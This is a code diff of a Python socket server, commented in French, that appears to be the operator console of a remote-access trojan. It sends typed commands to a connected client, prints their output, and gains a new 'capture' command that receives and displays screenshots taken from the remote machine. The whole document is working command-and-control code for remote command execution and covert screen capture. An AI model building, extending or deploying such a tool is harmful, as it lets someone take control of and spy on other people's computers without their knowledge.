@@ -1,6 +1,7 @@
 import socket
 import subprocess
 import os
+from PIL import Image
 
 ip_add = "127.0.0.1"
 port = 3280
@@ -23,19 +24,32 @@ def send_command(conn):
     while True:
         
         command = input("> ")
+        conn.send(command.encode("utf-8"))
 
         if command.lower() == "exit":
             print("Closing connection.")
             conn.close()
             break
-
-        # Envoi de la commande
-        conn.send(command.encode("utf-8"))
-
-        # Réception du résultat
-        result = conn.recv(4096).decode("utf-8", errors="replace") 
-        print(result)  # Affichage du résultat côté serveur
+        elif command == "capture":
+            receive_screen(conn)
+        else:
+            result = conn.recv(4096).decode("utf-8", errors="replace") # Recoie le résultat
+            print(result)  # Affichage du résultat côté serveur
         
+        
+def receive_screen(conn):
+    # Recoie la taille de l'image
+    size = int.from_bytes(conn.recv(4), 'big')
+    width = int.from_bytes(conn.recv(4), 'big')
+    height = int.from_bytes(conn.recv(4), 'big')
+
+    # Recoie les données de l'image
+    img_data = b""
+    while len(img_data) < size:
+        img_data += conn.recv(4096)
+
+    img = Image.frombytes("RGB", (width, height), img_data) # Reconstruit l'image et l'affiche
+    img.show()
 
 
 if __name__ == "__main__":
@@ -45,8 +59,3 @@ if __name__ == "__main__":
         accept_socket(s)
     except:
         print(f"cannot listen on port : {port}")
-
-
-
-
-   
